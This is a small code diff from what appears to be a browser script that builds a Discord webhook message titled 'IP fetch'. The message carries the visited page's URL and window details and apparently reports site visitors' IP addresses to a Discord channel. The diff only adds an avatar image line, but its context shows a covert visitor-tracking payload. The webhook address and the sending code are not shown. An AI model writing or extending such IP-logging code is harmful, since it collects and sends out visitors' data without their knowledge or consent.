@@ -21,6 +21,7 @@ request.setRequestHeader('Content-type', 'application/json'); //basically just s
       const windowHeight = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
       const Payload = { // the whole payload thing is what you send to the webhook and the webhook will say hmm yes okay okay okay i will tell discord daddy to go send a message yes okay bye
         username: window.location.href.slice(0,80), //username DUUUHH
+        avatar_url: '/images/favicon.png', //avatar
         embeds: [
           {
             title: 'IP fetch',
